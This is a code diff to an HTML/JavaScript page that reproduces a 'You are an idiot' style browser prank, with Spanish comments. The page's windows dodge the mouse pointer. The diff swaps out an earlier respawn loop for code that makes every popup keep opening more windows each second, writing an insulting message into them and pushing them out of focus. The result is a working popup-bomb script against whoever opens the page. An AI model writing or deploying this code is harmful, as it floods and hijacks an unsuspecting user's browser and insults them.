@@ -59,7 +59,7 @@
                 document.addEventListener('mousemove', (event) => {
                   const windowX = window.screenX;
                   const windowY = window.screenY;
-                  const distance = 150; // Distancia para que huya
+                  const distance = 150;
 
                   if (Math.abs(event.screenX - windowX) < distance && Math.abs(event.screenY - windowY) < distance) {
                     const newX = Math.floor(Math.random() * (window.screen.availWidth - window.outerWidth));
@@ -68,11 +68,17 @@
                   }
                 });
 
-                // Intentar abrir más ventanas desde dentro de la ventana
-                setInterval(() => {
-                  const win = window.open('', '_blank', 'width=400,height=300');
-                  if (win) win.blur();
-                }, 500);
+                // Función recursiva para abrir nuevas ventanas desde cada ventana emergente
+                function abrirVentanasRecursivamente() {
+                  setInterval(() => {
+                    const win = window.open('', '_blank', 'width=400,height=300');
+                    if (win) {
+                      win.document.write('<p style="color: yellow; font-size: 20px; background: black; text-align: center;">You are an idiot!</p>');
+                      win.blur();
+                    }
+                  }, 1000);
+                }
+                abrirVentanasRecursivamente();
               <\/script>
             </body>
           </html>
@@ -81,11 +87,8 @@
       }
     }
 
-    // Configurar apertura continua aunque el usuario cierre la ventana principal
-    window.onbeforeunload = () => setTimeout(abrirNuevaVentana, 100);
-
-    // Ejecutar continuamente la función para abrir nuevas ventanas
-    setInterval(abrirNuevaVentana, 300);
+    // Comienza el ciclo de ventanas en la página principal
+    abrirNuevaVentana();
   </script>
 </body>
 </html>
